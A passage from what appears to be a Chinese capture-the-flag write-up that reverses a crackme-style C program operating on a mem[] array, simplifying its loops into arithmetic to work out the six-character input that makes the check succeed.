class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">22</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">29</span>])&#123;</span><br><span class="line">        mem[<span class="number">29</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">35</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">29</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">6</span>])&#123;</span><br><span class="line">        mem[<span class="number">6</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">35</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">6</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">7</span>])&#123;</span><br><span class="line">        mem[<span class="number">7</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">36</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">7</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">20</span>])&#123;</span><br><span class="line">        mem[<span class="number">20</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">36</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">20</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">3</span>])&#123;</span><br><span class="line">        mem[<span class="number">3</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">36</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">3</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">17</span>])&#123;</span><br><span class="line">        mem[<span class="number">17</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">36</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">17</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">30</span>])&#123;</span><br><span class="line">        mem[<span class="number">30</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">36</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">30</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    mem[<span class="number">37</span>]=<span class="number">0</span>;</span><br><span class="line">    mem[<span class="number">37</span>]+=<span class="number">53</span>;</span><br><span class="line">    mem[<span class="number">38</span>]=<span class="number">0</span>;</span><br><span class="line">    mem[<span class="number">38</span>]-=<span class="number">28</span>;</span><br><span class="line">    mem[<span class="number">39</span>]=<span class="number">0</span>;</span><br><span class="line">    mem[<span class="number">39</span>]+=<span class="number">5</span>;</span><br><span class="line">    mem[<span class="number">40</span>]=<span class="number">0</span>;</span><br><span class="line">    mem[<span class="number">40</span>]-=<span class="number">98</span>;</span><br><span class="line">    mem[<span class="number">41</span>]=<span class="number">0</span>;</span><br><span class="line">    mem[<span class="number">41</span>]+=<span class="number">73</span>;</span><br><span class="line">    mem[<span class="number">42</span>]=<span class="number">0</span>;</span><br><span class="line">    mem[<span class="number">42</span>]+=<span class="number">123</span>;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">31</span>])&#123;</span><br><span class="line">        mem[<span class="number">31</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">37</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">31</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">32</span>])&#123;</span><br><span class="line">        mem[<span class="number">32</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">38</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">32</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">33</span>])&#123;</span><br><span class="line">        mem[<span class="number">33</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">39</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">33</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">34</span>])&#123;</span><br><span class="line">        mem[<span class="number">34</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">40</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">34</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">35</span>])&#123;</span><br><span class="line">        mem[<span class="number">35</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">41</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">35</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">36</span>])&#123;</span><br><span class="line">        mem[<span class="number">36</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">42</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">36</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    mem[<span class="number">43</span>]=<span class="number">0</span>;</span><br><span class="line">    mem[<span class="number">43</span>]+=<span class="number">48</span>;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">37</span>])&#123;</span><br><span class="line">        mem[<span class="number">43</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">37</span>]=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">38</span>])&#123;</span><br><span class="line">        mem[<span class="number">43</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">38</span>]=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">39</span>])&#123;</span><br><span class="line">        mem[<span class="number">43</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">39</span>]=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">40</span>])&#123;</span><br><span class="line">        mem[<span class="number">43</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">40</span>]=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">41</span>])&#123;</span><br><span class="line">        mem[<span class="number">43</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">41</span>]=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">42</span>])&#123;</span><br><span class="line">        mem[<span class="number">43</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">42</span>]=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>,&amp;mem[<span class="number">44</span>]);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>,&amp;mem[<span class="number">45</span>]);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>,&amp;mem[<span class="number">46</span>]);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>,&amp;mem[<span class="number">47</span>]);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>,&amp;mem[<span class="number">48</span>]);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>,&amp;mem[<span class="number">49</span>]);</span><br><span class="line">    mem[<span class="number">50</span>]=<span class="number">0</span>;</span><br><span class="line">    mem[<span class="number">50</span>]+=<span class="number">101</span>;</span><br><span class="line">    mem[<span class="number">51</span>]=<span class="number">0</span>;</span><br><span class="line">    mem[<span class="number">51</span>]+=<span class="number">95</span>;</span><br><span class="line">    mem[<span class="number">52</span>]=<span class="number">0</span>;</span><br><span class="line">    mem[<span class="number">52</span>]+=<span class="number">67</span>;</span><br><span class="line">    mem[<span class="number">53</span>]=<span class="number">0</span>;</span><br><span class="line">    mem[<span class="number">53</span>]+=<span class="number">48</span>;</span><br><span class="line">    mem[<span class="number">54</span>]=<span class="number">0</span>;</span><br><span class="line">    mem[<span class="number">54</span>]+=<span class="number">100</span>;</span><br><span class="line">    mem[<span class="number">55</span>]=<span class="number">0</span>;</span><br><span class="line">    mem[<span class="number">55</span>]+=<span class="number">51</span>;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">44</span>])&#123;</span><br><span class="line">        mem[<span class="number">44</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">50</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">44</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">45</span>])&#123;</span><br><span class="line">        mem[<span class="number">45</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">51</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">45</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">46</span>])&#123;</span><br><span class="line">        mem[<span class="number">46</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">52</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">46</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">47</span>])&#123;</span><br><span class="line">        mem[<span class="number">47</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">53</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">47</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">48</span>])&#123;</span><br><span class="line">        mem[<span class="number">48</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">54</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">48</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">49</span>])&#123;</span><br><span class="line">        mem[<span class="number">49</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">55</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">        mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">49</span>]+=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">50</span>])&#123;</span><br><span class="line">        mem[<span class="number">43</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">50</span>]=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">51</span>])&#123;</span><br><span class="line">        mem[<span class="number">43</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">51</span>]=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">52</span>])&#123;</span><br><span class="line">        mem[<span class="number">43</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">52</span>]=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">53</span>])&#123;</span><br><span class="line">        mem[<span class="number">43</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">53</span>]=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">54</span>])&#123;</span><br><span class="line">        mem[<span class="number">43</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">54</span>]=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(mem[<span class="number">55</span>])&#123;</span><br><span class="line">        mem[<span class="number">43</span>]+=<span class="number">1</span>;</span><br><span class="line">        mem[<span class="number">55</span>]=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,mem[<span class="number">43</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>于是现在的任务就成了分两次输入6个字符，经过处理后若mem[43]&#x3D;&#x3D;48（原二进制文件中的判断逻辑）就能得到flag。</p><p>这个C程序还是比较冗杂（毕竟九百多行），所以对其进行找规律分析化简。</p><p>先拿出前四个while即[line 10, line 27]进行分析：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(mem[<span class="number">1</span>])&#123;</span><br><span class="line">    mem[<span class="number">1</span>]-=<span class="number">1</span>;</span><br><span class="line">    mem[<span class="number">7</span>]+=<span class="number">1</span>;</span><br><span class="line">    mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">&#125; <span class="comment">// mem[7]+=mem[1];mem[0]+=mem[1];mem[1]=0;</span></span><br><span class="line"><span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">    mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">    mem[<span class="number">1</span>]+=<span class="number">1</span>;</span><br><span class="line">&#125; <span class="comment">// mem[1]+=mem[0];mem[0]=0;</span></span><br><span class="line"><span class="keyword">while</span>(mem[<span class="number">1</span>])&#123;</span><br><span class="line">    mem[<span class="number">1</span>]-=<span class="number">1</span>;</span><br><span class="line">    mem[<span class="number">7</span>]+=<span class="number">1</span>;</span><br><span class="line">    mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">&#125; <span class="comment">// mem[7]+=mem[1];mem[0]+=mem[1];mem[1]=0;</span></span><br><span class="line"><span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">    mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">    mem[<span class="number">1</span>]+=<span class="number">1</span>;</span><br><span class="line">&#125; <span class="comment">// mem[1]+=mem[0];mem[0]=0;</span></span><br></pre></td></tr></table></figure><p>也就是说整段等同于：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mem[<span class="number">7</span>]+=mem[<span class="number">1</span>]*<span class="number">2</span>;</span><br><span class="line"><span class="comment">// mem[0]和mem[1]没变</span></span><br></pre></td></tr></table></figure><p>所以接下来的(6-1)*4个循环也做相同处理，即[line 10, line 117]可以简化为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mem[<span class="number">7</span>]+=mem[<span class="number">1</span>]*<span class="number">2</span>;</span><br><span class="line">mem[<span class="number">8</span>]+=mem[<span class="number">2</span>]*<span class="number">2</span>;</span><br><span class="line">mem[<span class="number">9</span>]+=mem[<span class="number">3</span>]*<span class="number">2</span>;</span><br><span class="line">mem[<span class="number">10</span>]+=mem[<span class="number">4</span>]*<span class="number">2</span>;</span><br><span class="line">mem[<span class="number">11</span>]+=mem[<span class="number">5</span>]*<span class="number">2</span>;</span><br><span class="line">mem[<span class="number">12</span>]+=mem[<span class="number">6</span>]*<span class="number">2</span>;</span><br></pre></td></tr></table></figure><p>然后再拿出四个while即[line 118, line 135]进行分析：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(mem[<span class="number">7</span>])&#123;</span><br><span class="line">    mem[<span class="number">7</span>]-=<span class="number">1</span>;</span><br><span class="line">    mem[<span class="number">13</span>]+=<span class="number">1</span>;</span><br><span class="line">    mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">&#125; <span class="comment">// mem[13]+=mem[7];mem[0]+=mem[7];mem[7]=0;</span></span><br><span class="line"><span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">    mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">    mem[<span class="number">7</span>]+=<span class="number">1</span>;</span><br><span class="line">&#125; <span class="comment">// mem[7]+=mem[0];mem[0]=0;</span></span><br><span class="line"><span class="keyword">while</span>(mem[<span class="number">1</span>])&#123;</span><br><span class="line">    mem[<span class="number">1</span>]-=<span class="number">1</span>;</span><br><span class="line">    mem[<span class="number">13</span>]+=<span class="number">1</span>;</span><br><span class="line">    mem[<span class="number">0</span>]+=<span class="number">1</span>;</span><br><span class="line">&#125; <span class="comment">// mem[13]+=mem[1];mem[0]+=mem[1];mem[1]=0;</span></span><br><span class="line"><span class="keyword">while</span>(mem[<span class="number">0</span>])&#123;</span><br><span class="line">    mem[<span class="number">0</span>]-=<span class="number">1</span>;</span><br><span class="line">    mem[<span class="number">1</span>]+=<span class="number">1</span>;</span><br><span class="line">&#125; <span class="comment">// mem[1]+=mem[0];mem[0]=0;</span></span><br></pre></td></tr></table></figure><p>所以整段等同于：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mem[<span class="number">13</span>]=mem[<span class="number">1</span>]+mem[<span class="number">7</span>];</span><br></pre></td></tr></table></figure><p>所以[line 118, line 225]简化为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mem[<span class="number">13</span>]=mem[<span class="number">1</span>]+mem[<span class="number">7</span>];</span><br><span class="line">mem[<span class="number">14</span>]=mem[<span class="number">2</span>]+mem[<span class="number">8</span>];</span><br><span class="line">mem[<span class="number">15</span>]=mem[<span class="number">3</span>]+mem[<span class="number">9</span>];</span><br><span class="line">mem[<span class="number">16</span>]=mem[<span class="number">4</span>]+mem[<span class="number">10</span>];</span><br><span class="line">mem[<span class="number">17</span>]=mem[<span class="number">5</span>]+mem[<span class="number">11</span>];</span><br><span class="line">mem[<span class="number">18</span>]=mem[<span class="number">6</span>]+mem[<span class="number">12</span>];</span><br></pre></td></tr></table></figure><p><strong>最后[line 10, line 803]可简化为</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">mem[<span class="number">7</span>]+=mem[<span class="number">1</span>]*<span class="number">2</span>;</span><br><span class="line">mem[<span class="number">8</span>]+=mem[<span class="number">2</span>]*<span class="number">2</span>;</span><br><span class="line">mem[<span class="number">9</span>]+=mem[<span class="number">3</span>]*<span class="number">2</span>;</span><br><span class="line">mem[<span class="number">10</span>]+=mem[<span class="number">4</span>]*<span class="number">2</span>;</span><br><span class="line">mem[<span class="number">11</span>]+=mem[<span class="number">5</span>]*<span class="number">2</span>;</span><br><span class="line">mem[<span class="number">12</span>]+=mem[<span class="number">6</span>]*<span class="number">2</span>;</span><br><span class="line"><span class="comment">// [line 10, line 117]</span></span><br><span class="line">mem[<span class="number">13</span>]=mem[<span class="number">1</span>]+mem[<span class="number">7</span>];</span><br><span class="line">mem[<span class="number">14</span>]=mem[<span class="number">2</span>]+mem[<span class="number">8</span>];</span><br><span class="line">mem[<span class="number">15</span>]=mem[<span class="number">3</span>]+mem[<span class="number">9</span>];</span><br><span class="line">mem[<span class="number">16</span>]=mem[<span class="number">4</span>]+mem[<span class="number">10</span>];</span><br><span class="line">mem[<span class="number">17</span>]=mem[<span class="number">5</span>]+mem[<span class="number">11</span>];</span><br><span class="line">mem[<span class="number">18</span>]=mem[<span class="number">6</span>]+mem[<span class="number">12</span>];</span><br><span class="line"><span class="comment">// [line 118, line 225]</span></span><br><span class="line">mem[<span class="number">19</span>]=mem[<span class="number">1</span>]+mem[<span class="number">13</span>];</span><br><span class="line">mem[<span class="number">20</span>]=mem[<span class="number">2</span>]+mem[<span class="number">14</span>];</span><br><span class="line">mem[<span class="number">21</span>]=mem[<span class="number">3</span>]+mem[<span class="number">15</span>];</span><br><span class="line">mem[<span class="number">22</span>]=mem[<span class="number">4</span>]+mem[<span class="number">16</span>];</span><br><span class="line">mem[<span class="number">23</span>]=mem[<span class="number">5</span>]+mem[<span class="number">17</span>];</span><br><span class="line">mem[<span class="number">24</span>]=mem[<span class="number">6</span>]+mem[<span class="number">18</span>];</span><br><span class="line"><span class="comment">// [line 226, line 333]</span></span><br><span class="line">mem[<span class="number">25</span>]=mem[<span class="number">1</span>]+mem[<span class="number">19</span>];</span><br><span class="line">mem[<span class="number">26</span>]=mem[<span class="number">2</span>]+mem[<span class="number">20</span>];</span><br><span class="line">mem[<span class="number">27</span>]=mem[<span class="number">3</span>]+mem[<span class="number">21</span>];</span><br><span class="line">mem[<span class="number">28</span>]=mem[<span class="number">4</span>]+mem[<span class="number">22</span>];</span><br><span class="line">mem[<span class="number">29</span>]=mem[<span class="number">5</span>]+mem[<span class="number">23</span>];</span><br><span class="line">mem[<span class="number">30</span>]=mem[<span class="number">6</span>]+mem[<span class="number">24</span>];</span><br><span class="line"><span class="comment">// [line 334, line 441]</span></span><br><span class="line">mem[<span class="number">31</span>]=mem[<span class="number">2</span>]+mem[<span class="number">9</span>]+mem[<span class="number">16</span>]+mem[<span class="number">23</span>]+mem[<span class="number">30</span>];</span><br><span class="line">mem[<span class="number">32</span>]=mem[<span class="number">25</span>]+mem[<span class="number">20</span>]+mem[<span class="number">15</span>]+mem[<span class="number">10</span>]+mem[<span class="number">5</span>];</span><br><span class="line">mem[<span class="number">33</span>]=mem[<span class="number">13</span>]+mem[<span class="number">8</span>]+mem[<span class="number">3</span>]+mem[<span class="number">22</span>]+mem[<span class="number">30</span>];</span><br><span class="line">mem[<span class="number">34</span>]=mem[<span class="number">7</span>]+mem[<span class="number">2</span>]+mem[<span class="number">21</span>]+mem[<span class="number">28</span>]+mem[<span class="number">17</span>];</span><br><span class="line">mem[<span class="number">35</span>]=mem[<span class="number">8</span>]+mem[<span class="number">15</span>]+mem[<span class="number">22</span>]+mem[<span class="number">29</span>]+mem[<span class="number">6</span>];</span><br><span class="line">mem[<span class="number">36</span>]=mem[<span class="number">7</span>]+mem[<span class="number">20</span>]+mem[<span class="number">3</span>]+mem[<span class="number">17</span>]+mem[<span 